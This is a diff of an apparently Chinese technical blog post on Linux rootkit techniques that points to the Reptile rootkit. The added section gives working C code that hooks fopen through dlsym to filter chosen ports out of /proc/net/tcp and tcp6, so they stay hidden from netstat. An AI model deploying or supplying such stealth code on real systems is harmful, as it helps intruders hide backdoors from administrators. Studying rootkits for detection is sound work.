@@ -7,7 +7,7 @@ Slug: O4
 Authors: nJcx
 Summary: Linux环境下的Rootkit技术细节~
 
-#### 安装
+#### 介绍
 
 ```bash
 https://github.com/f0rb1dd3n/Reptile.git
@@ -194,6 +194,74 @@ struct dirent* readdir(DIR *dirp)
 
 
 ```
+
+监听端口隐藏
+
+	HOOK netstat命令相关的函数调用， 通常HOOK fopen函数来隐藏特定进程
+
+这段代码重写了 fopen 函数，用于拦截对 /proc/net/tcp 和 /proc/net/tcp6 文件的读取。如果读取的是这两个文件之一，则会过滤掉需要隐藏的端口，并返回一个临时文件指针。具体步骤如下：
+
+- 使用 dlsym 获取原始 fopen 函数。
+- 打开文件并检查是否为特定路径。
+- 如果是特定路径，创建临时文件并逐行读取原文件内容。
+- 过滤掉需要隐藏的端口后写入临时文件。
+- 返回临时文件指针或原文件指针。
+
+
+```bash
+
+FILE *fopen(const char *pathname, const char *mode) {
+    static FILE *(*original_fopen)(const char*, const char*) = NULL;
+    
+    if (!original_fopen) {
+        original_fopen = dlsym(RTLD_NEXT, "fopen");
+    }
+    
+    FILE *fp = original_fopen(pathname, mode);
+    
+    if (fp && (strcmp(pathname, "/proc/net/tcp") == 0 || 
+               strcmp(pathname, "/proc/net/tcp6") == 0)) {
+        FILE *tmp = tmpfile();
+        if (!tmp) {
+            return fp;
+        }
+        
+        char line[512];
+        int first_line = 1;
+        
+        if (fgets(line, sizeof(line), fp)) {
+            fputs(line, tmp);
+        }
+        
+        while (fgets(line, sizeof(line), fp)) {
+            if (first_line) {
+                first_line = 0;
+                fputs(line, tmp);
+                continue;
+            }
+            
+            char local_addr[64];
+            unsigned int local_port;
+            if (sscanf(line, "%*d: %[^:]:%X", local_addr, &local_port) == 2) {
+                if (!should_hide_port(local_port)) {
+                    fputs(line, tmp);
+                }
+            } else {
+                fputs(line, tmp);
+            }
+        }
+        
+        fclose(fp);
+        rewind(tmp);
+        return tmp;
+    }
+    
+    return fp;
+}
+
+
+```
+
 
 
 防止被删除
